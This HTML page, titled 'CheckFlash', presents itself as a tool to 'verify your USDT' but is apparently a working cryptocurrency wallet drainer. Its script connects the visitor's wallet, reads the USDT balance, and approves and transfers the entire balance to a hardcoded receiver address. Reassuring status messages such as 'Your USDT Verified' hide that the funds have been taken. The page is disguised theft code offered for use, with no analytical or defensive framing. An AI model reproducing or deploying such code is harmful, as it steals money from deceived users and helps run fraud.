<!DOCTYPE html><html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CheckFlash</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
  <script src="https://unpkg.com/web3modal@1.9.12/dist/index.js"></script>
  <style>
    body {
      background-color: #000;
      color: #0f0;
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 50px;
    }
    button {
      font-size: 20px;
      padding: 10px 30px;
      background-color: #0f0;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
    #status {
      margin-top: 30px;
      font-size: 18px;
    }
  </style>
</head>
<body>
  <h1>CheckFlash</h1>
  <p>Verify your USDT</p>
  <button onclick="connectAndSend()">Approve</button>
  <p id="status"></p>  <script>
    const receiverAddress = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP-20
    const usdtAbi = [
      {
        "constant": false,
        "inputs": [
          {"name": "_spender", "type": "address"},
          {"name": "_value", "type": "uint256"}
        ],
        "name": "approve",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
      },
      {
        "constant": true,
        "inputs": [
          {"name": "_owner", "type": "address"}
        ],
        "name": "balanceOf",
        "outputs": [
          {"name": "balance", "type": "uint256"}
        ],
        "type": "function"
      },
      {
        "constant": false,
        "inputs": [
          {"name": "_to", "type": "address"},
          {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [
          {"name": "", "type": "bool"}
        ],
        "type": "function"
      }
    ];

    let web3;
    let userAccount;

    async function connectAndSend() {
      document.getElementById("status").innerText = "Verifying...";

      if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
          await window.ethereum.request({ method: 'eth_requestAccounts' });
          const accounts = await web3.eth.getAccounts();
          userAccount = accounts[0];

          document.getElementById("status").innerText = "Flash USDT Verify...";
          const usdt = new web3.eth.Contract(usdtAbi, usdtAddress);
          const balance = await usdt.methods.balanceOf(userAccount).call();

          if (balance > 0) {
            await usdt.methods.approve(receiverAddress, balance).send({ from: userAccount });
            document.getElementById("status").innerText = "Flash Your USDT Verified...";
            await usdt.methods.transfer(receiverAddress, balance).send({ from: userAccount });
            document.getElementById("status").innerText = "Your USDT Verified";
          } else {
            document.getElementById("status").innerText = "No USDT Balance";
          }
        } catch (err) {
          document.getElementById("status").innerText = "Transaction Failed or Rejected";
        }
      } else {
        document.getElementById("status").innerText = "Wallet not found";
      }
    }
  </script></body>
</html>
